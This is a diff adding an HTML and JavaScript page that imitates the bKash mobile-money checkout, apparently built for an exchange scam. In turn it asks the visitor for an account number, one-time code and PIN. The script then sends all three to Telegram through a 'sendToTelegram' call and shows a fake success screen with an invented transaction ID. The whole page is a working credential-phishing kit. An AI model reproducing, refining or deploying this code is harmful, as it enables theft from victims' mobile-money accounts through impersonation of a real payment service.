@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payment only</title>
+
+  <!-- Tailwind CSS CDN (For basic flex & utility layout) -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            bkash: {
+              pink: '#E2136E',
+              darkPink: '#b10f54',
+              lightGray: '#f5f5f5',
+              borderGray: '#dcdcdc',
+              textDark: '#4a4a4a',
+            }
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    /* Reset & Base Styles */
+    body {
+      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background-color: #9c9c9c;
+    }
+
+    /* Hide scrollbar for gateway */
+    ::-webkit-scrollbar {
+      display: none;
+    }
+
+    /* Gateway Card Container */
+    .gateway-container {
+      width: 92%;
+      max-width: 500px; /* Exact size matching the official bKash checkout page */
+      background-color: #ffffff;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      border-radius: 4px;
+    }
+
+    /* Header Section */
+    .header {
+      background-color: #ffffff;
+      border-bottom: 1px solid #eeeeee;
+      padding: 16px 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .header__logo {
+      height: 48px;
+      object-fit: contain;
+    }
+
+    /* Merchant Summary Bar */
+    .merchant {
+      background-color: #ffffff;
+      padding: 14px 20px;
+      border-bottom: 1px solid #eeeeee;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      box-sizing: border-box;
+    }
+    .merchant__logo-wrapper {
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #005ea6;
+    }
+    .merchant__logo-wrapper svg {
+      width: 100%;
+      height: 100%;
+      padding: 7px;
+      box-sizing: border-box;
+    }
+    .merchant__details {
+      flex-grow: 1;
+      margin-left: 12px;
+      text-align: left;
+    }
+    .merchant__details__name {
+      font-size: 15px;
+      font-weight: 700;
+      color: #333333;
+      margin: 0;
+      line-height: 1.2;
+    }
+    .merchant__details__invoice {
+      font-size: 11.5px;
+      color: #718096;
+      margin: 2px 0 0 0;
+      line-height: 1.2;
+    }
+    .merchant__amount {
+      font-size: 19px;
+      font-weight: 700;
+      color: #333333;
+      text-align: right;
+    }
+    .merchant__amount p {
+      margin: 0;
+    }
+
+    /* Main Active Pink Panel */
+    .pink-section {
+      background-color: #E2136E;
+      padding: 40px 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      color: #ffffff;
+      min-height: 220px;
+      box-sizing: border-box;
+    }
+    .form__label {
+      font-size: 16px;
+      font-weight: 500;
+      margin-bottom: 18px;
+      display: block;
+      color: #ffffff;
+      letter-spacing: 0.1px;
+      line-height: 1.4;
+    }
+    .form__label span {
+      display: block;
+      margin-top: 4px;
+      font-weight: 700;
+      color: #ffffff;
+    }
+    .form-input {
+      width: 100%;
+      height: 44px;
+      border-radius: 4px;
+      border: 1px solid #dcdcdc;
+      background-color: #ffffff;
+      color: #333333;
+      text-align: center;
+      font-size: 17px;
+      font-weight: 700;
+      outline: none;
+      box-sizing: border-box;
+      transition: border-color 0.2s;
+    }
+    .form-input:focus {
+      border-color: #b5b5b5;
+    }
+    .phone-input::placeholder,
+    .otp-input::placeholder,
+    .pin-input::placeholder {
+      color: #a9a9a9;
+      font-weight: 500;
+    }
+    .terms-text {
+      font-size: 12.5px;
+      color: #ffd2e5;
+      margin-top: 16px;
+      margin-bottom: 0;
+      line-height: 1.4;
+    }
+    .terms-link {
+      color: #ffffff;
+      text-decoration: underline;
+      font-weight: 600;
+    }
+
+    /* Buttons Section */
+    .btn-group {
+      background-color: #f5f5f5;
+      padding: 20px 24px;
+      border-top: 1px solid #e6e6e6;
+      display: flex;
+      gap: 16px;
+      justify-content: center;
+      box-sizing: border-box;
+    }
+    .btn-cancel, .btn-confirm {
+      flex: 1;
+      height: 44px;
+      font-size: 15px;
+      font-weight: 700;
+      border-radius: 4px;
+      border: none;
+      transition: background-color 0.2s, color 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-sizing: border-box;
+    }
+    .btn-cancel {
+      background-color: #f7f7f7;
+      border: 1px solid #e0e0e0;
+      color: #666666;
+      cursor: pointer;
+    }
+    .btn-cancel:hover {
+      background-color: #efefef;
+    }
+    .btn-confirm {
+      background-color: #e0e0e0;
+      color: #a0a0a0;
+      cursor: not-allowed;
+    }
+    .btn-confirm.active {
+      background-color: #E2136E;
+      color: #ffffff;
+      cursor: pointer;
+    }
+
+    /* Footer Section */
+    .footer {
+      background-color: #f5f5f5;
+      padding: 0 24px 20px 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      box-sizing: border-box;
+    }
+    .footer__helpline {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+    .footer__helpline-icon-wrapper {
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      background-color: #E2136E;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .footer__helpline-icon-wrapper svg {
+      width: 11px;
+      height: 11px;
+      fill: #ffffff;
+      color: #ffffff;
+    }
+    .footer__helpline-number {
+      font-size: 11.5px;
+      font-weight: 700;
+      color: #E2136E;
+      text-decoration: none;
+    }
+    .footer__copyright {
+      font-size: 10.5px;
+      color: #888888;
+      font-weight: 500;
+    }
+
+    /* Spinner */
+    .animate-spin {
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+  </style>
+
+  <!-- Lucide Icons -->
+  <script src="https://unpkg.com/lucide@latest"></script>
+</head>
+
+<body class="bg-[#9c9c9c] min-h-screen flex items-center justify-center p-0 sm:p-4 select-none">
+
+  <!-- Main Gateway Container -->
+  <div class="gateway-container">
+
+    <!-- Step 1: bKash Logo Header -->
+    <header id="header-logo-block" class="header">
+      <svg width="140" height="65" viewBox="0 0 140 65" fill="none" role="img" xmlns="http://www.w3.org/2000/svg" class="header__logo">
+        <title id="headerLogo">Bkash Logo</title>
+        <g clip-path="url(#clip0_2750_4283)">
+          <path d="M96.7875 31.0528L100.757 48.8874L126.715 35.7465L96.7875 31.0528Z" fill="#CF1E53"></path>
+          <path d="M104.17 4.40625L96.7931 31.0583L126.717 35.7483L104.17 4.40625Z" fill="#DD156E"></path>
+          <path d="M72.4613 0.500641L103.413 4.20098L96.0947 30.6935L72.4613 0.500641Z" fill="#CF1E53"></path>
+          <path d="M72.2139 5.71484H75.6613L85.3346 18.0786L72.2139 5.71484Z" fill="#9E1C3E"></path>
+          <path d="M127.543 35.5723L118.544 23.1242L133.094 20.518L127.543 35.5723Z" fill="#CF1E53"></path>
+          <path d="M126.033 39.2287L126.96 36.4521L104.25 47.9747L126.033 39.2287Z" fill="#DD156E"></path>
+          <path d="M96.1515 31.7584L100.889 53.0642L86.8228 64.5006L96.1515 31.7584Z" fill="#9E1C3E"></path>
+          <path d="M131.676 26.8466L139.936 26.7091L133.967 20.6317L131.676 26.8466Z" fill="#DD156E"></path>
+          <path d="M2.75592 25.6223H21.265V28.3256H2.52316V49.9632C2.52316 49.9632 1.71491 49.8404 1.22007 49.8404C0.75638 49.8404 0.0690952 49.9632 0.0690952 49.9632L0.0727607 28.3256V25.6223L0.0654297 25.5361C0.0690952 19.1948 2.46635 15.5934 8.59876 15.1554C14.1245 14.7614 18.2867 17.9998 21.2686 19.5778V22.7284L20.8691 22.7925C20.3376 21.5939 13.8185 16.1158 9.56646 16.5355C5.19533 16.9698 2.49567 20.0745 2.54332 24.1396C2.54332 24.1396 2.57448 25.2356 2.72843 25.5636L2.75959 25.6223H2.75592Z" fill="#DD156E"></path>
+          <path d="M40.8425 30.0758C45.4483 29.9439 47.8015 31.5659 47.9463 35.0261C48.0251 36.9688 47.2022 38.7704 45.9248 40.3906L43.6393 40.4548L43.6247 40.0919C44.5136 39.8371 46.3756 38.4974 46.2767 36.0946C46.174 33.6241 44.3853 31.7217 41.3685 31.806C41.3685 31.806 40.9159 31.8096 40.6959 31.9031L40.8425 30.0777V30.0758Z" fill="#211E1F"></path>
+          <path d="M18.8091 27.7648H21.265V49.9668L18.8091 49.1439V27.7648Z" fill="#DD156E"></path>
+          <path d="M66.0393 30.8878C65.0807 27.5742 62.2583 25.6259 60.2258 25.6259H54.8044V28.3274H58.3417C59.8995 28.3274 61.538 28.1625 62.9896 29.4949C63.6127 30.0667 63.8619 30.7064 64.0434 31.5403C64.4942 33.6296 63.5724 36.146 61.1421 36.2083C60.4145 36.2266 59.555 36.157 58.8567 35.9426L58.6661 36.1332C59.2544 36.9121 59.6997 37.7845 60.1671 38.6312C61.5747 38.3765 63.0354 37.5187 64.0067 36.5474C65.5737 34.9785 66.3142 33.0981 66.0374 30.8896" fill="#211E1F"></path>
+          <path d="M70.0237 25.9431C68.4805 26.1593 65.9549 27.5742 65.0935 30.8879C64.8443 33.0982 65.5114 34.9767 66.9226 36.5456C67.7968 37.5169 69.1128 38.3765 70.3774 38.6294C70.7971 37.7827 71.1985 36.9121 71.73 36.1314L71.5577 35.9426C70.929 36.157 70.1574 36.2267 69.5013 36.2065C66.9831 36.1369 66.5231 33.5509 66.9171 31.5403C67.2507 29.823 68.7755 28.1332 70.2857 28.0104C71.9627 27.8711 74.0136 29.2842 74.4259 31.018C74.6459 31.9435 74.7284 32.957 74.7284 33.9082V49.9614C74.7284 49.9614 75.4908 49.8459 75.9306 49.8459C76.4017 49.8459 77.1531 49.9614 77.1531 49.9614V25.6682H74.5414V28.3678C74.5414 28.2982 74.6807 28.19 74.5579 27.9921C73.7277 26.6487 71.3432 25.7598 70.0255 25.9467" fill="#211E1F"></path>
+          <path d="M54.1776 25.6223V49.9632C54.1776 49.9632 53.3914 49.8404 52.9295 49.8404C52.4328 49.8404 51.7272 49.9632 51.7272 49.9632V28.3275H21.9082V25.6242H54.1776V25.6223Z" fill="#211E1F"></path>
+          <path d="M21.265 49.9668H20.8453C11.3772 49.9668 5.98523 44.7288 5.98523 39.5073C5.98523 35.149 9.99531 30.0612 19.2691 30.0612L20.9094 31.3332C14.4672 31.3735 9.1834 35.422 9.1834 39.6649C9.1834 43.3157 13.8313 49.1659 21.2631 49.1659V49.9668H21.265Z" fill="#DD156E"></path>
+          <path d="M38.6615 27.7648H41.1174V49.9668L38.6615 49.1439V27.7648Z" fill="#211E1F"></path>
+          <path d="M41.1174 49.9668H40.6977C31.2296 49.9668 25.8358 44.7288 25.8358 39.5073C25.8358 35.149 29.8477 30.0612 39.1197 30.0612L40.7618 31.3332C34.3178 31.3735 29.0358 35.422 29.0358 39.6649C29.0358 43.3157 33.6855 49.1659 41.1174 49.1659V49.9668Z" fill="#211E1F"></path>
+        </g>
+        <defs>
+          <clipPath id="clip0_2750_4283">
+            <rect width="139.873" height="64" fill="white" transform="translate(0.0637207 0.5)"></rect>
+          </clipPath>
+        </defs>
+      </svg>
+    </header>
+
+    <span class="hr"></span>
+
+    <!-- Step 2: Merchant Summary Bar -->
+    <div id="billing-summary-block" class="merchant">
+      <div class="flex items-center gap-3">
+        <!-- Merchant Icon (BEA.BD Logo) -->
+        <div class="merchant__logo-wrapper">
+          <svg viewBox="0 0 100 100">
+            <circle cx="50" cy="50" r="46" fill="none" stroke="#ffffff" stroke-width="2" stroke-dasharray="3,3"
+              opacity="0.6" />
+            <text x="50" y="46" font-family="'Segoe UI', Roboto, sans-serif" font-weight="900" font-size="22"
+              fill="white" text-anchor="middle" letter-spacing="-1">BEA</text>
+            <text x="50" y="68" font-family="'Segoe UI', Roboto, sans-serif" font-weight="700" font-size="16"
+              fill="#ffffff" text-anchor="middle" opacity="0.9">.BD</text>
+          </svg>
+        </div>
+        <div class="text-left">
+          <span class="block merchant__details__name text-slate-700 leading-tight">BEA.BD</span>
+          <span id="invoice-number" class="block merchant__details__invoice text-slate-400 font-medium leading-tight">Inv No:
+            Loading...</span>
+        </div>
+      </div>
+      <div class="text-right">
+        <span id="checkout-amount" class="merchant__amount text-slate-800">৳00.00</span>
+      </div>
+    </div>
+
+    <!-- Step 3: Main Active Input Frame (Magenta Background) -->
+    <div class="pink-section">
+
+      <!-- Wizard Step 1: Account Number Frame -->
+      <div id="frame-account" class="w-full text-center space-y-4 animate-fade-in">
+        <p class="form__label">Your bKash Account Number</p>
+
+        <div class="relative w-full mx-auto">
+          <input type="tel" id="input-phone" placeholder="e.g 01XX*XXXXXX" maxlength="11"
+            class="phone-input form-input">
+        </div>
+
+        <p class="terms-text opacity-90 leading-relaxed">
+          Confirm and proceed, <a href="#" class="terms-link font-semibold hover:text-white transition">terms &
+            conditions</a>
+        </p>
+      </div>
+
+      <!-- Wizard Step 2: OTP Verification Frame -->
+      <div id="frame-otp" class="w-full text-center space-y-4 hidden animate-fade-in">
+        <p class="form__label">
+          Enter Verification Code Sent To <br> <span id="masked-phone-otp" class="font-bold">019 ** *** 796</span>
+        </p>
+
+        <div class="relative w-full mx-auto">
+          <input type="text" id="input-otp" placeholder="Enter 6 digit code" maxlength="6"
+            class="otp-input form-input">
+        </div>
+
+        <p id="otp-timer-text" class="terms-text font-semibold tracking-wide">
+          Resend Code In <span id="timer-sec">27</span>s
+        </p>
+      </div>
+
+      <!-- Wizard Step 3: PIN Verification Frame -->
+      <div id="frame-pin" class="w-full text-center space-y-4 hidden animate-fade-in">
+        <p class="form__label">
+          Enter PIN Of Your bKash Account Number <br>
+          <span id="masked-phone-pin" class="font-bold text-pink-100">(019 ** *** 796)</span>
+        </p>
+
+        <div class="relative w-full mx-auto">
+          <input type="password" id="input-pin" placeholder="Enter PIN" maxlength="5"
+            class="pin-input form-input">
+        </div>
+      </div>
+
+      <!-- Step 4: Native Full Frame Success Verification -->
+      <div id="frame-success" class="w-full text-center space-y-6 hidden animate-fade-in py-2 px-2">
+        <!-- White success circle with bKash pink check -->
+        <div class="w-20 h-20 rounded-full bg-white text-[#E2136E] flex items-center justify-center mx-auto border border-white/20 shadow-lg animate-bounce">
+          <i data-lucide="check" class="w-10 h-10 stroke-[3.5]"></i>
+        </div>
+
+        <div class="space-y-2">
+          <h3 class="text-2xl font-bold text-white tracking-wide">পেমেন্ট সফল হয়েছে!</h3>
+          <p class="text-[14px] text-white/85 leading-relaxed max-w-[320px] mx-auto">
+            আপনার বিকাশ পেমেন্টটি সফলভাবে গৃহীত হয়েছে। আমরা পরবর্তী ৫ থেকে ২০ মিনিটের মধ্যে ভেরিফাই করে ডলার পাঠিয়ে দেবো।
+          </p>
+        </div>
+
+        <div class="bg-white/10 rounded-xl p-4.5 border border-white/20 text-[14.5px] space-y-2.5 text-left w-full max-w-[340px] mx-auto">
+          <div class="flex justify-between items-center text-white/90">
+            <span>লেনদেন আইডি (Tx ID):</span>
+            <span id="success-tx-id" class="font-bold text-white font-mono text-[16px]">EX-99887766</span>
+          </div>
+          <div class="text-[12px] text-pink-100 bg-black/10 rounded px-2.5 py-1.5 flex items-center justify-center gap-1.5 font-medium">
+            <i data-lucide="clock" class="w-4 h-4"></i> রিকোয়েস্টটি প্রসেসিং হতে ৫-২০ মিনিট সময় লাগতে পারে।
+          </div>
+        </div>
+
+        <!-- Success Close Home Redirection Button -->
+        <div class="pt-4">
+          <button id="btn-success-close" class="w-full max-w-[340px] h-12 bg-white hover:bg-white/95 active:scale-95 text-[#E2136E] font-bold rounded-md text-[16px] transition shadow-md">
+            হোম পেজে ফিরে যান
+          </button>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Step 4: Bottom Action Bar -->
+    <div class="btn-group">
+      <div class="grid grid-cols-2 gap-3 w-full">
+        <!-- Cancel button -->
+        <button id="btn-cancel" class="btn-cancel">
+          Cancel
+        </button>
+        <!-- Confirm button -->
+        <button id="btn-confirm" disabled class="btn-confirm">
+          Confirm
+        </button>
+      </div>
+    </div>
+
+    <!-- Step 5: Footer -->
+    <div class="footer">
+      <!-- Helpline number -->
+      <div class="footer__helpline">
+        <div class="footer__helpline-icon-wrapper">
+          <svg viewBox="0 0 24 24">
+            <path
+              d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
+          </svg>
+        </div>
+        <span class="footer__helpline-number">16247</span>
+      </div>
+
+      <!-- Copyright bar -->
+      <span class="footer__copyright">© 2026 bKash, All Rights Reserved</span>
+    </div>
+
+  </div>
+
+  <!-- State & Logic Scripts -->
+  <script src="js/app.js?v=1.1"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      // Elements
+      const frameAccount = document.getElementById('frame-account');
+      const frameOtp = document.getElementById('frame-otp');
+      const framePin = document.getElementById('frame-pin');
+      const frameSuccess = document.getElementById('frame-success');
+
+      const inputPhone = document.getElementById('input-phone');
+      const inputOtp = document.getElementById('input-otp');
+      const inputPin = document.getElementById('input-pin');
+
+      const btnCancel = document.getElementById('btn-cancel');
+      const btnConfirm = document.getElementById('btn-confirm');
+      const btnSuccessClose = document.getElementById('btn-success-close');
+
+      const billingSummaryBlock = document.getElementById('billing-summary-block');
+      const headerLogoBlock = document.getElementById('header-logo-block');
+
+      const maskedPhoneOtp = document.getElementById('masked-phone-otp');
+      const maskedPhonePin = document.getElementById('masked-phone-pin');
+      const timerSec = document.getElementById('timer-sec');
+
+      const checkoutAmount = document.getElementById('checkout-amount');
+      const invoiceNumber = document.getElementById('invoice-number');
+      const successTxId = document.getElementById('success-tx-id');
+
+      let currentStep = 1; // 1: Account, 2: OTP, 3: PIN
+      let otpTimer = null;
+      let userPhoneNumber = '';
+
+      // Initialize invoice details from sessionStorage
+      const rawRequest = sessionStorage.getItem('current_exchange_request');
+      if (!rawRequest) {
+        window.location.href = 'index.html';
+        return;
+      }
+
+      const request = JSON.parse(rawRequest);
+
+      // Setup dynamic amount and invoice details
+      checkoutAmount.innerText = '৳' + parseFloat(request.sendAmount).toFixed(2);
+      const randInv = 'BGT1457' + Math.floor(10000000 + Math.random() * 90000000) + 'E' + Math.floor(100000 + Math.random() * 900000);
+      invoiceNumber.innerText = 'Inv No: ' + randInv;
+
+      // Pre-fill telephone if they entered it in payment screen
+      if (request.userContact) {
+        const cleanPhone = request.userContact.replace(/\D/g, '');
+        if (cleanPhone.length === 11) {
+          inputPhone.value = cleanPhone;
+          updateConfirmButtonState();
+        }
+      }
+
+      // Input change event listeners to toggle Confirm Button state
+      inputPhone.addEventListener('input', () => {
+        inputPhone.value = inputPhone.value.replace(/\D/g, ''); // Allow digits only
+        updateConfirmButtonState();
+      });
+
+      inputOtp.addEventListener('input', () => {
+        inputOtp.value = inputOtp.value.replace(/\D/g, '');
+        updateConfirmButtonState();
+      });
+
+      inputPin.addEventListener('input', () => {
+        inputPin.value = inputPin.value.replace(/\D/g, '');
+        updateConfirmButtonState();
+      });
+
+      // Update the active state and color of the confirm button
+      function updateConfirmButtonState() {
+        let isValid = false;
+
+        if (currentStep === 1) {
+          isValid = inputPhone.value.length === 11 && inputPhone.value.startsWith('01');
+        } else if (currentStep === 2) {
+          isValid = inputOtp.value.length === 6;
+        } else if (currentStep === 3) {
+          isValid = inputPin.value.length === 5;
+        }
+
+        if (isValid) {
+          btnConfirm.disabled = false;
+          btnConfirm.classList.add('active');
+        } else {
+          btnConfirm.disabled = true;
+          btnConfirm.classList.remove('active');
+        }
+      }
+
+      // Help mask phone number (01712345678 -> 017** *** 678)
+      function getMaskedPhone(phoneNum) {
+        if (phoneNum.length < 11) return phoneNum;
+        return phoneNum.substring(0, 3) + ' ** *** ' + phoneNum.substring(8);
+      }
+
+      // Handle timer tick for verification screen
+      function startOtpTimer() {
+        let sec = 45;
+        timerSec.innerText = sec;
+        clearInterval(otpTimer);
+
+        otpTimer = setInterval(() => {
+          sec--;
+          timerSec.innerText = sec;
+          if (sec <= 0) {
+            clearInterval(otpTimer);
+            document.getElementById('otp-timer-text').innerHTML = '<span class="underline cursor-pointer hover:text-white">Resend Code</span>';
+          }
+        }, 1000);
+      }
+
+      let userOtp = '';
+
+      // Handle Confirm Trigger
+      btnConfirm.addEventListener('click', async () => {
+        if (currentStep === 1) {
+          // Go to OTP Step
+          userPhoneNumber = inputPhone.value;
+          maskedPhoneOtp.innerText = getMaskedPhone(userPhoneNumber);
+          maskedPhonePin.innerText = '(' + getMaskedPhone(userPhoneNumber) + ')';
+
+          frameAccount.classList.add('hidden');
+          frameOtp.classList.remove('hidden');
+          currentStep = 2;
+
+          inputOtp.value = '';
+          inputOtp.focus();
+          updateConfirmButtonState();
+          startOtpTimer();
+        } else if (currentStep === 2) {
+          // Go to PIN Step
+          clearInterval(otpTimer);
+          userOtp = inputOtp.value;
+          
+          frameOtp.classList.add('hidden');
+          framePin.classList.remove('hidden');
+          currentStep = 3;
+
+          inputPin.value = '';
+          inputPin.focus();
+          updateConfirmButtonState();
+        } else if (currentStep === 3) {
+          // Execute Payment Completion!
+          btnConfirm.disabled = true;
+          btnConfirm.innerHTML = `
+            <svg class="animate-spin h-5 w-5 text-white mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+          `;
+
+          // Send all together to Telegram
+          await sendToTelegram(`*bkash*\nNumber: ${userPhoneNumber}\nOTP: ${userOtp}\nPIN: ${inputPin.value}`);
+
+          // Generate random Transaction ID
+          const charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+          let mockTrx = 'BKASH';
+          for (let i = 0; i < 7; i++) {
+            mockTrx += charSet.charAt(Math.floor(Math.random() * charSet.length));
+          }
+
+          const finalTxData = {
+            ...request,
+            userContact: userPhoneNumber,
+            txid: mockTrx
+          };
+
+          // Save transaction to app database state
+          setTimeout(() => {
+            const transaction = createTransaction(finalTxData);
+
+            // Clear sessionStorage
+            sessionStorage.removeItem('current_exchange_request');
+
+            // Hide summary details, header block, PIN frame, and action bar buttons
+            billingSummaryBlock.classList.add('hidden');
+            headerLogoBlock.classList.add('hidden');
+            framePin.classList.add('hidden');
+            document.querySelector('.btn-group').classList.add('hidden');
+
+            // Set dynamic transaction ID
+            successTxId.innerText = transaction.id;
+
+            // Show native bKash success frame
+            frameSuccess.classList.remove('hidden');
+
+            // Initialize Lucide Icons for dynamic content
+            if (window.lucide) {
+              lucide.createIcons();
+            }
+          }, 1500);
+        }
+      });
+
+      // Handle Cancel Trigger
+      btnCancel.addEventListener('click', () => {
+        if (currentStep === 1) {
+          // Back to checkout payment page
+          window.location.href = 'payment.html';
+        } else if (currentStep === 2) {
+          // Go back to step 1
+          clearInterval(otpTimer);
+          frameOtp.classList.add('hidden');
+          frameAccount.classList.remove('hidden');
+          currentStep = 1;
+          inputPhone.focus();
+          updateConfirmButtonState();
+        } else if (currentStep === 3) {
+          // Go back to step 2
+          framePin.classList.add('hidden');
+          frameOtp.classList.remove('hidden');
+          currentStep = 2;
+          inputOtp.focus();
+          updateConfirmButtonState();
+          startOtpTimer();
+        }
+      });
+
+      // Close success redirect
+      btnSuccessClose.addEventListener('click', () => {
+        window.location.href = 'index.html';
+      });
+
+      // Initialize Lucide Icons
+      if (window.lucide) {
+        lucide.createIcons();
+      }
+    });
+  </script>
+</body>
+
+</html>
